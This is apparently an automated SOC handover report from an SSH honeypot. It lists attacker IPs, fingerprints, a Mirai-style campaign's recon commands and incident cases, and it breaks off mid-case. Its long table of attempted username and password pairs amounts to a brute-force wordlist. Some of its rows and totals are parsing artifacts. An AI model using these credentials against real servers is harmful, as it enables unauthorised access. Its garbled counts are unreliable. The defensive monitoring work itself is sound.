# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-25 |
| **Generated At** | 2026-06-25T10:47:33Z |
| **Shift Time** | 10:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **620** |
| Confirmed Threats | **614** |
| False Positives Filtered | **6** (1.0%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **12** |
| High Severity Cases | **273** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **347** |
| Malware Samples Analyzed | **5** HIGH · **30** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **281** |
| Unique Credential Pairs | **267** |
| Unique Usernames | **115** |
| Unique Passwords | **208** |
| Successful Auth Pairs | **271** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 63 |
| `ubuntu` | 8 |
| `admin` | 8 |
| `user` | 7 |
| `oracle` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 13 |
| `1234` | 6 |
| `123456a` | 5 |
| `12345678` | 5 |
| `1` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `` | 4 |
| `support` | `support` | 4 |
| `root` | `123@@@` | 3 |
| `root` | `LeitboGi0ro` | 3 |
| `admin` | `admin` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qingdao123` | `209.99.185.59` | 2026-06-25T06:55:29 |
| `support` | `support321` | `139.59.86.13` | 2026-06-25T06:55:31 |
| `developer` | `developer123` | `139.59.86.13` | 2026-06-25T06:56:21 |
| `ubuntu` | `admin1234` | `209.99.185.59` | 2026-06-25T06:56:23 |
| `root` | `r2d2c3p0` | `209.99.185.59` | 2026-06-25T06:57:15 |
| `root` | `mickey` | `209.99.185.59` | 2026-06-25T06:58:06 |
| `ftpuser` | `ftpuser@4321` | `139.59.86.13` | 2026-06-25T06:58:26 |
| `user01` | `user011234` | `139.59.86.13` | 2026-06-25T06:58:58 |
| `root` | `Creativeman=3` | `209.99.185.59` | 2026-06-25T06:58:58 |
| `root` | `motorola` | `209.99.185.59` | 2026-06-25T06:59:52 |
| `nagios` | `nagios123` | `139.59.86.13` | 2026-06-25T07:00:31 |
| `u` | `u123456` | `209.99.185.59` | 2026-06-25T07:00:48 |
| `zhouh` | `q1w2e3` | `209.99.185.59` | 2026-06-25T07:01:42 |
| `root` | `firefly` | `209.99.185.59` | 2026-06-25T07:02:33 |
| `testuser` | `123123` | `139.59.86.13` | 2026-06-25T07:02:45 |
| `nagios` | `5` | `139.59.86.13` | 2026-06-25T07:02:53 |
| `dingy` | `1234qwer` | `209.99.185.59` | 2026-06-25T07:03:26 |
| `hslee` | `123456a` | `139.59.86.13` | 2026-06-25T07:03:36 |
| `grid` | `3` | `139.59.86.13` | 2026-06-25T07:03:49 |
| `wjjang` | `wjjang` | `209.99.185.59` | 2026-06-25T07:04:18 |
| `mojia` | `123456` | `209.99.185.59` | 2026-06-25T07:05:12 |
| `ubuntu` | `qwer1234` | `209.99.185.59` | 2026-06-25T07:06:05 |
| `root` | `PassWord` | `45.205.1.42` | 2026-06-25T07:06:53 |
| `ubuntu` | `1qaz"WSX` | `209.99.185.59` | 2026-06-25T07:07:03 |
| `user` | `12345678` | `139.59.86.13` | 2026-06-25T07:07:53 |
| `deploy` | `1q2w3e4r` | `209.99.185.59` | 2026-06-25T07:08:00 |
| `postgres` | `12345678` | `139.59.86.13` | 2026-06-25T07:08:48 |
| `sunil` | `sunil@123` | `139.59.86.13` | 2026-06-25T07:08:51 |
| `nagios` | `123` | `209.99.185.59` | 2026-06-25T07:08:55 |
| `developer` | `111111` | `139.59.86.13` | 2026-06-25T07:09:45 |
| `root` | `Qwerty123?` | `209.99.185.59` | 2026-06-25T07:09:49 |
| `user01` | `user01@321` | `139.59.86.13` | 2026-06-25T07:09:51 |
| `mysql` | `test` | `209.99.185.59` | 2026-06-25T07:10:43 |
| `postgres` | `postgres54321` | `139.59.86.13` | 2026-06-25T07:10:55 |
| `wy` | `1` | `209.99.185.59` | 2026-06-25T07:11:36 |
| `dspace` | `123123123` | `139.59.86.13` | 2026-06-25T07:11:51 |
| `taeho` | `taeho` | `209.99.185.59` | 2026-06-25T07:12:31 |
| `oracle` | `123456a` | `139.59.86.13` | 2026-06-25T07:12:54 |
| `oracle` | `zaq1wsx` | `139.59.86.13` | 2026-06-25T07:13:04 |
| `support` | `support` | `51.158.248.122` | 2026-06-25T07:13:05 |
| `ceshi3` | `ceshi3123` | `209.99.185.59` | 2026-06-25T07:13:27 |
| `others` | `others` | `209.99.185.59` | 2026-06-25T07:14:24 |
| `dbuser` | `dbuser54321` | `139.59.86.13` | 2026-06-25T07:14:54 |
| `zjw` | `123456` | `209.99.185.59` | 2026-06-25T07:15:20 |
| `sunil` | `123456789` | `139.59.86.13` | 2026-06-25T07:15:52 |
| `root` | `P@ss@1234` | `209.99.185.59` | 2026-06-25T07:16:15 |
| `user2` | `user254321` | `139.59.86.13` | 2026-06-25T07:17:02 |
| `dev` | `dev@123456` | `139.59.86.13` | 2026-06-25T07:17:05 |
| `buero3` | `123456` | `209.99.185.59` | 2026-06-25T07:17:10 |
| `root` | `123@@@` | `144.22.238.238` | 2026-06-25T07:17:29 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-06-25T07:17:30 |
| `dspace` | `123456a` | `139.59.86.13` | 2026-06-25T07:17:46 |
| `dspace` | `qwerty` | `139.59.86.13` | 2026-06-25T07:18:02 |
| `david` | `cho28540531` | `209.99.185.59` | 2026-06-25T07:18:08 |
| `deploy` | `12345678` | `139.59.86.13` | 2026-06-25T07:18:57 |
| `root` | `changeme!@#$` | `209.99.185.59` | 2026-06-25T07:19:04 |
| `ubuntu` | `ubuntu@2021` | `209.99.185.59` | 2026-06-25T07:20:01 |
| `gpadmin` | `123456` | `139.59.86.13` | 2026-06-25T07:20:10 |
| `dev` | `dev4321` | `139.59.86.13` | 2026-06-25T07:20:37 |
| `root` | `6666666` | `209.99.185.59` | 2026-06-25T07:20:58 |
| `weblogic` | `P@ssw0rd` | `139.59.86.13` | 2026-06-25T07:21:18 |
| `root` | `qwert12` | `45.205.1.42` | 2026-06-25T07:21:48 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.195.203` | 2026-06-25T07:21:52 |
| `root` | `1qaz2WSX` | `209.99.185.59` | 2026-06-25T07:21:55 |
| `wildfly` | `wildfly123` | `139.59.86.13` | 2026-06-25T07:22:01 |
| `*1` | `$4` | `34.156.195.203` | 2026-06-25T07:22:05 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7558` | `34.156.195.203` | 2026-06-25T07:22:07 |
| `zabbix` | `welcome` | `139.59.86.13` | 2026-06-25T07:22:14 |
| `suporte` | `sup0rt3` | `209.99.185.59` | 2026-06-25T07:22:51 |
| `neos` | `neos12345` | `139.59.86.13` | 2026-06-25T07:22:59 |
| `user` | `Huawei12#$` | `139.59.86.13` | 2026-06-25T07:23:11 |
| `test1` | `test1@123` | `139.59.86.13` | 2026-06-25T07:23:13 |
| `yangk` | `yangk` | `209.99.185.59` | 2026-06-25T07:23:45 |
| `sftpeft` | `fxltsbl123` | `209.99.185.59` | 2026-06-25T07:24:39 |
| `admin` | `admin1234` | `139.59.86.13` | 2026-06-25T07:25:17 |
| `oracle` | `qwerty` | `209.99.185.59` | 2026-06-25T07:25:34 |
| `test1` | `abc123!` | `139.59.86.13` | 2026-06-25T07:25:45 |
| `user02` | `9` | `139.59.86.13` | 2026-06-25T07:26:14 |
| `zouqiran` | `zouqiran1916` | `209.99.185.59` | 2026-06-25T07:26:30 |
| `dhis` | `12345678` | `139.59.86.13` | 2026-06-25T07:27:18 |
| `dell` | `Admin@7777` | `209.99.185.59` | 2026-06-25T07:27:27 |
| `zabbix` | `zabbix@123456` | `139.59.86.13` | 2026-06-25T07:28:23 |
| `zabbix` | `zabbix123456` | `139.59.86.13` | 2026-06-25T07:28:23 |
| `root` | `qwerty4321` | `209.99.185.59` | 2026-06-25T07:28:23 |
| `root` | `Root@123456` | `209.99.185.59` | 2026-06-25T07:29:17 |
| `xiao` | `xiao` | `209.99.185.59` | 2026-06-25T07:30:11 |
| `jsr` | `5b944e0d` | `209.99.185.59` | 2026-06-25T07:31:08 |
| `huangyuanyuan` | `huangyuanyuan` | `209.99.185.59` | 2026-06-25T07:32:04 |
| `user01` | `user011234567` | `139.59.86.13` | 2026-06-25T07:32:24 |
| `root` | `---fuck_you----` | `111.23.129.238` | 2026-06-25T07:32:41 |
| `dell` | `admin@!QAZxsw2` | `209.99.185.59` | 2026-06-25T07:33:01 |
| `root` | `﻿------fuck------` | `49.84.226.110` | 2026-06-25T07:33:44 |
| `inven6` | `inven6` | `209.99.185.59` | 2026-06-25T07:33:58 |
| `redis` | `abcd1234` | `139.59.86.13` | 2026-06-25T07:34:03 |
| `dbuser` | `3` | `139.59.86.13` | 2026-06-25T07:34:18 |
| `tomcat` | `Huawei12#$` | `139.59.86.13` | 2026-06-25T07:34:21 |
| `admin` | `admin` | `141.11.88.108` | 2026-06-25T07:34:27 |
| `db2fenc1` | `321` | `209.99.185.59` | 2026-06-25T07:34:56 |
| `mahesh` | `mahesh@4321` | `139.59.86.13` | 2026-06-25T07:35:46 |
| `zhouh` | `zhouh` | `209.99.185.59` | 2026-06-25T07:35:53 |
| `root` | `rootteam` | `45.205.1.42` | 2026-06-25T07:36:43 |
| `root` | `qwepoiasdlkj` | `209.99.185.59` | 2026-06-25T07:36:52 |
| `root` | `123@@@` | `129.153.145.135` | 2026-06-25T07:37:50 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-06-25T07:37:50 |
| `root` | `*************` | `209.99.185.59` | 2026-06-25T07:37:51 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-06-25T07:37:54 |
| `testuser` | `1234` | `139.59.86.13` | 2026-06-25T07:38:39 |
| `root` | `qwer4321` | `209.99.185.59` | 2026-06-25T07:38:50 |
| `dspace` | `1` | `139.59.86.13` | 2026-06-25T07:39:18 |
| `gpadmin` | `gpadmin4321` | `139.59.86.13` | 2026-06-25T07:39:35 |
| `yangyiyang` | `yangyiyang` | `209.99.185.59` | 2026-06-25T07:39:54 |
| `root` | `ch` | `209.99.185.59` | 2026-06-25T07:40:54 |
| `boot` | `111111` | `209.99.185.59` | 2026-06-25T07:41:52 |
| `dhis` | `dhis@1234567` | `139.59.86.13` | 2026-06-25T07:42:38 |
| `server` | `test321` | `209.99.185.59` | 2026-06-25T07:42:51 |
| `tomcat` | `1234` | `209.99.185.59` | 2026-06-25T07:43:51 |
| `root` | `cartorio` | `209.99.185.59` | 2026-06-25T07:44:53 |
| `user02` | `1` | `139.59.86.13` | 2026-06-25T07:45:40 |
| `ubuntu` | `asd1234567` | `209.99.185.59` | 2026-06-25T07:45:56 |
| `ljy` | `123456` | `209.99.185.59` | 2026-06-25T07:46:57 |
| `user01` | `9` | `139.59.86.13` | 2026-06-25T07:47:48 |
| `root` | `8` | `209.99.185.59` | 2026-06-25T07:47:59 |
| `app01` | `app01` | `209.99.185.59` | 2026-06-25T07:49:01 |
| `ftpuser` | `Huawei12#$` | `139.59.86.13` | 2026-06-25T07:49:44 |
| `agora` | `agora` | `209.99.185.59` | 2026-06-25T07:50:06 |
| `grid` | `123456a` | `139.59.86.13` | 2026-06-25T07:50:44 |
| `mahesh` | `11111111` | `139.59.86.13` | 2026-06-25T07:50:51 |
| `dani` | `dani` | `209.99.185.59` | 2026-06-25T07:51:11 |
| `dbuser` | `dbuser@1234` | `139.59.86.13` | 2026-06-25T07:51:13 |
| `karim` | `karim` | `45.205.1.42` | 2026-06-25T07:51:38 |
| `developer` | `Huawei12#$` | `139.59.86.13` | 2026-06-25T07:51:51 |
| `dhis` | `password!` | `139.59.86.13` | 2026-06-25T07:52:02 |
| `meklis` | `123456` | `209.99.185.59` | 2026-06-25T07:52:19 |
| `vmsec` | `vmsec` | `209.99.185.59` | 2026-06-25T07:53:21 |
| `user` | `user#123` | `209.99.185.59` | 2026-06-25T07:54:25 |
| `wildfly` | `1` | `139.59.86.13` | 2026-06-25T07:55:05 |
| `myl` | `123456` | `209.99.185.59` | 2026-06-25T07:55:27 |
| `zhangyang` | `zy123` | `209.99.185.59` | 2026-06-25T07:56:30 |
| `git` | `12345678` | `139.59.86.13` | 2026-06-25T07:56:45 |
| `test1` | `4` | `139.59.86.13` | 2026-06-25T07:56:59 |
| `test` | `p@ssw0rd` | `209.99.185.59` | 2026-06-25T07:57:36 |
| `user` | `3` | `139.59.86.13` | 2026-06-25T07:57:57 |
| `root` | `plasma!@#` | `209.99.185.59` | 2026-06-25T07:58:43 |
| `testuser` | `iloveyou` | `139.59.86.13` | 2026-06-25T07:58:54 |
| `git` | `000000` | `139.59.86.13` | 2026-06-25T07:58:57 |
| `root` | `jenkins` | `209.99.185.59` | 2026-06-25T07:59:49 |
| `wildfly` | `pass123!` | `139.59.86.13` | 2026-06-25T08:00:04 |
| `weblogic` | `weblogic@54321` | `139.59.86.13` | 2026-06-25T08:00:06 |
| `root` | `laravel` | `209.99.185.59` | 2026-06-25T08:00:41 |
| `neos` | `neos` | `139.59.86.13` | 2026-06-25T08:00:54 |
| `root` | `123asd` | `209.99.185.59` | 2026-06-25T08:01:23 |
| `root` | `founderbn` | `209.99.185.59` | 2026-06-25T08:02:05 |
| `sunil` | `12345` | `139.59.86.13` | 2026-06-25T08:02:11 |
| `root` | `Root@2025` | `209.99.185.59` | 2026-06-25T08:02:52 |
| `ftpuser` | `ftpuser@12345678` | `139.59.86.13` | 2026-06-25T08:03:08 |
| `root` | `tang` | `209.99.185.59` | 2026-06-25T08:03:36 |
| `zabbix` | `a123456` | `139.59.86.13` | 2026-06-25T08:04:04 |
| `jboss` | `11111111` | `139.59.86.13` | 2026-06-25T08:04:10 |
| `zhanghao` | `zhanghao` | `209.99.185.59` | 2026-06-25T08:04:19 |
| `root` | `1qazxcvb` | `209.99.185.59` | 2026-06-25T08:05:04 |
| `redis` | `redis@1234567` | `139.59.86.13` | 2026-06-25T08:05:15 |
| `root` | `qwe12356` | `209.99.185.59` | 2026-06-25T08:05:48 |
| `test1` | `0` | `139.59.86.13` | 2026-06-25T08:06:13 |
| `root` | `edu` | `209.99.185.59` | 2026-06-25T08:06:32 |
| `root` | `oracol123` | `45.205.1.42` | 2026-06-25T08:06:48 |
| `postgres` | `pass` | `209.99.185.59` | 2026-06-25T08:07:18 |
| `lsp` | `lsp` | `209.99.185.59` | 2026-06-25T08:08:07 |
| `backup` | `6` | `139.59.86.13` | 2026-06-25T08:08:24 |
| `yladmin` | `yladmin` | `209.99.185.59` | 2026-06-25T08:08:53 |
| `root` | `qwerty` | `139.59.86.13` | 2026-06-25T08:09:15 |
| `apache` | `qwerty123` | `209.99.185.59` | 2026-06-25T08:09:37 |
| `oracle` | `1234` | `139.59.86.13` | 2026-06-25T08:10:22 |
| `backup` | `changeme` | `209.99.185.59` | 2026-06-25T08:10:24 |
| `postgres` | `0` | `209.99.185.59` | 2026-06-25T08:11:10 |
| `jenkins` | `abcd1234` | `139.59.86.13` | 2026-06-25T08:11:20 |
| `wan` | `wq@xjtu` | `209.99.185.59` | 2026-06-25T08:11:55 |
| `test` | `changeme` | `139.59.86.13` | 2026-06-25T08:12:19 |
| `grid` | `grid12345678` | `139.59.86.13` | 2026-06-25T08:12:22 |
| `root` | `mima123456` | `209.99.185.59` | 2026-06-25T08:12:43 |
| `oracle` | `changeme123` | `209.99.185.59` | 2026-06-25T08:13:28 |
| `dcmadmin` | `passw0rd` | `209.99.185.59` | 2026-06-25T08:14:11 |
| `applprod` | `applprod@123456` | `139.59.86.13` | 2026-06-25T08:14:20 |
| `server` | `qwe123` | `209.99.185.59` | 2026-06-25T08:14:57 |
| `root` | `Tencent@123` | `209.99.185.59` | 2026-06-25T08:15:46 |
| `pul` | `1q2w3e4r` | `209.99.185.59` | 2026-06-25T08:16:32 |
| `admin1` | `123456` | `209.99.185.59` | 2026-06-25T08:17:22 |
| `flutter` | `123456` | `209.99.185.59` | 2026-06-25T08:18:09 |
| `impala` | `impala123` | `209.99.185.59` | 2026-06-25T08:18:55 |
| `grid` | `abcd1234` | `139.59.86.13` | 2026-06-25T08:19:38 |
| `dspfyy` | `123456` | `209.99.185.59` | 2026-06-25T08:19:41 |
| `liuhz20` | `WxSLIqsd21M=` | `209.99.185.59` | 2026-06-25T08:20:26 |
| `root` | `Admin1235` | `209.99.185.59` | 2026-06-25T08:21:12 |
| `postgres` | `11111111` | `139.59.86.13` | 2026-06-25T08:21:36 |
| `root` | `Root2020` | `45.205.1.42` | 2026-06-25T08:21:38 |
| `dyd` | `123` | `209.99.185.59` | 2026-06-25T08:21:58 |
| `support` | `pass123!` | `139.59.86.13` | 2026-06-25T08:22:37 |
| `sysman` | `123456` | `209.99.185.59` | 2026-06-25T08:22:44 |
| `test1` | `letmein` | `139.59.86.13` | 2026-06-25T08:23:14 |
| `aitech` | `666666` | `209.99.185.59` | 2026-06-25T08:23:29 |
| `ftp_user` | `1` | `139.59.86.13` | 2026-06-25T08:23:41 |
| `sunil` | `sunil@12345678` | `139.59.86.13` | 2026-06-25T08:23:43 |
| `asus` | `111111` | `209.99.185.59` | 2026-06-25T08:24:15 |
| `testuser` | `Password1` | `139.59.86.13` | 2026-06-25T08:24:55 |
| `root` | `Passwd!` | `209.99.185.59` | 2026-06-25T08:25:01 |
| `dhis` | `dhis@123` | `139.59.86.13` | 2026-06-25T08:25:38 |
| `ubuntu` | `q1w2e3r` | `209.99.185.59` | 2026-06-25T08:25:45 |
| `root` | `123@@@` | `64.110.90.250` | 2026-06-25T08:25:51 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-06-25T08:25:52 |
| `user2` | `user21234567` | `139.59.86.13` | 2026-06-25T08:26:17 |
| `root` | `Password123$` | `209.99.185.59` | 2026-06-25T08:26:29 |
| `root` | `P@sswOrd` | `209.99.185.59` | 2026-06-25T08:27:15 |
| `weblogic` | `123` | `139.59.86.13` | 2026-06-25T08:27:45 |
| `freeneo_ir` | `1234` | `209.99.185.59` | 2026-06-25T08:28:00 |
| `nagios` | `nagios@321` | `139.59.86.13` | 2026-06-25T08:28:42 |
| `builder` | `Builder` | `209.99.185.59` | 2026-06-25T08:28:45 |
| `git` | `123123123` | `139.59.86.13` | 2026-06-25T08:28:46 |
| `user` | `iloveyou` | `139.59.86.13` | 2026-06-25T08:28:56 |
| `cyrus` | `cyrus` | `209.99.185.59` | 2026-06-25T08:29:31 |
| `root` | `zxcv!1234` | `209.99.185.59` | 2026-06-25T08:30:20 |
| `ysy` | `166.111.134.92` | `209.99.185.59` | 2026-06-25T08:31:07 |
| `user` | `micros_a9729` | `209.99.185.59` | 2026-06-25T08:31:52 |
| `tester` | `t3st3r` | `209.99.185.59` | 2026-06-25T08:32:37 |
| `gpadmin` | `gpadmin321` | `139.59.86.13` | 2026-06-25T08:32:44 |
| `ubuntu` | `!@#$1234` | `209.99.185.59` | 2026-06-25T08:33:22 |
| `weiyc` | `wyc0922..` | `209.99.185.59` | 2026-06-25T08:34:06 |
| `zabbix` | `1qaz@WSX` | `209.99.185.59` | 2026-06-25T08:34:51 |
| `mahesh` | `123123123` | `139.59.86.13` | 2026-06-25T08:34:52 |
| `node` | `letmein` | `139.59.86.13` | 2026-06-25T08:34:53 |
| `gt` | `123456` | `209.99.185.59` | 2026-06-25T08:35:37 |
| `dev` | `7` | `139.59.86.13` | 2026-06-25T08:36:03 |
| `root` | `q1w2e3r4t5y6` | `209.99.185.59` | 2026-06-25T08:36:24 |
| `root` | `Root2021` | `45.205.1.42` | 2026-06-25T08:36:45 |
| `amax` | `Amax1979!` | `209.99.185.59` | 2026-06-25T08:37:10 |
| `testuser` | `123qwe` | `139.59.86.13` | 2026-06-25T08:37:42 |
| `nagios` | `nagios1234` | `139.59.86.13` | 2026-06-25T08:37:45 |
| `ubuntu` | `1q2w3e4r5` | `209.99.185.59` | 2026-06-25T08:37:56 |
| `oracle` | `1q2w3e` | `139.59.86.13` | 2026-06-25T08:37:58 |
| `oracle` | `plokijuhy` | `209.99.185.59` | 2026-06-25T08:38:41 |
| `loose` | `loose` | `209.99.185.59` | 2026-06-25T08:39:26 |
| `user` | `abc123` | `139.59.86.13` | 2026-06-25T08:40:03 |
| `sbs` | `sbs` | `209.99.185.59` | 2026-06-25T08:40:11 |
| `ftpuser` | `123456a` | `139.59.86.13` | 2026-06-25T08:40:19 |
| `gwchen` | `wen@950105` | `209.99.185.59` | 2026-06-25T08:40:57 |
| `git` | `abcd1234` | `139.59.86.13` | 2026-06-25T08:41:03 |
| `tomcat` | `tomcat@654321` | `139.59.86.13` | 2026-06-25T08:41:04 |
| `neos` | `welcome1` | `139.59.86.13` | 2026-06-25T08:41:15 |
| `root` | `ag123456!` | `209.99.185.59` | 2026-06-25T08:41:44 |
| `cwen` | `cwen` | `209.99.185.59` | 2026-06-25T08:42:32 |
| `root` | `yongnian@123` | `209.99.185.59` | 2026-06-25T08:43:19 |
| `root` | `12qwas` | `209.99.185.59` | 2026-06-25T08:44:06 |
| `applprod` | `Changeme_123` | `139.59.86.13` | 2026-06-25T08:44:08 |
| `dl` | `123456` | `209.99.185.59` | 2026-06-25T08:44:52 |
| `root` | `gz@edu$2018` | `209.99.185.59` | 2026-06-25T08:45:39 |
| `jang` | `1234` | `209.99.185.59` | 2026-06-25T08:46:25 |
| `peixuanli` | `peixuanli` | `209.99.185.59` | 2026-06-25T08:47:12 |
| `wildfly` | `123` | `139.59.86.13` | 2026-06-25T08:47:12 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-06-25T08:47:44 |
| `root` | `1q2w3e4r@` | `209.99.185.59` | 2026-06-25T08:47:59 |
| `ftp1` | `syS111111` | `209.99.185.59` | 2026-06-25T08:48:48 |
| `zkimhoy` | `1234` | `209.99.185.59` | 2026-06-25T08:49:38 |
| `test1` | `8` | `139.59.86.13` | 2026-06-25T08:50:12 |
| `user10` | `user10` | `209.99.185.59` | 2026-06-25T08:50:28 |
| `yzx` | `yzxliuwei` | `209.99.185.59` | 2026-06-25T08:51:17 |
| `www` | `adrian140489` | `45.205.1.42` | 2026-06-25T08:51:49 |
| `uftp` | `1q2w3e` | `209.99.185.59` | 2026-06-25T08:52:06 |
| `sunil` | `password!` | `139.59.86.13` | 2026-06-25T08:52:23 |
| `admin` | `admin` | `10.0.0.73` | 2026-06-25T08:52:44 |
| `root` | `Root123!` | `209.99.185.59` | 2026-06-25T08:52:55 |
| `testuser` | `testuser@12345678` | `139.59.86.13` | 2026-06-25T08:53:17 |
| `syncUser` | `syncUser` | `209.99.185.59` | 2026-06-25T08:53:43 |
| `root` | `123456qq` | `209.99.185.59` | 2026-06-25T08:54:33 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **620** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 260 |
| libssh | 8 |
| Paramiko (Python) | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 147 | 2 |
| `98f63c4d9c87...` | Generic scanner | 110 | 3 |
| `a2de0f306611...` | Mirai/variant | 8 | 3 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 147 | 2 | Generic scanner |
| `98f63c4d9c87...` | Go SSH scanner | 110 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `a2de0f306611...` | Paramiko (Python) | 8 | 3 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
busybox TEST
```
```
cat /proc
```
```
/
```
Source IPs: `141.11.88.108`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **23** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS198364` | BANATSYNC SRL | 1 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | HIGH |
| `AS56047` | China Mobile communications corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (273)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8538f99f283d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 06:55 |
| **Last Seen** | 2026-06-25 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:55:29` | `cowrie.session.connect` |
| `2026-06-25 06:55:29` | `cowrie.client.version` |
| `2026-06-25 06:55:29` | `cowrie.client.kex` |
| `2026-06-25 06:55:29` | `cowrie.login.success` |
| `2026-06-25 06:55:30` | `cowrie.session.params` |
| `2026-06-25 06:55:30` | `cowrie.command.input` |
| `2026-06-25 06:55:30` | `cowrie.log.closed` |
| `2026-06-25 06:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-552855dfcf77

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 06:55 |
| **Last Seen** | 2026-06-25 06:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:55:30` | `cowrie.session.connect` |
| `2026-06-25 06:55:30` | `cowrie.client.version` |
| `2026-06-25 06:55:30` | `cowrie.client.kex` |
| `2026-06-25 06:55:31` | `cowrie.login.success` |
| `2026-06-25 06:55:33` | `cowrie.session.params` |
| `2026-06-25 06:55:33` | `cowrie.command.input` |
| `2026-06-25 06:55:33` | `cowrie.log.closed` |
| `2026-06-25 06:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d324b43247a

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 06:56 |
| **Last Seen** | 2026-06-25 06:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:56:20` | `cowrie.session.connect` |
| `2026-06-25 06:56:20` | `cowrie.client.version` |
| `2026-06-25 06:56:20` | `cowrie.client.kex` |
| `2026-06-25 06:56:21` | `cowrie.login.success` |
| `2026-06-25 06:56:22` | `cowrie.session.params` |
| `2026-06-25 06:56:22` | `cowrie.command.input` |
| `2026-06-25 06:56:22` | `cowrie.log.closed` |
| `2026-06-25 06:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3b4d6f962cf

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 06:56 |
| **Last Seen** | 2026-06-25 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

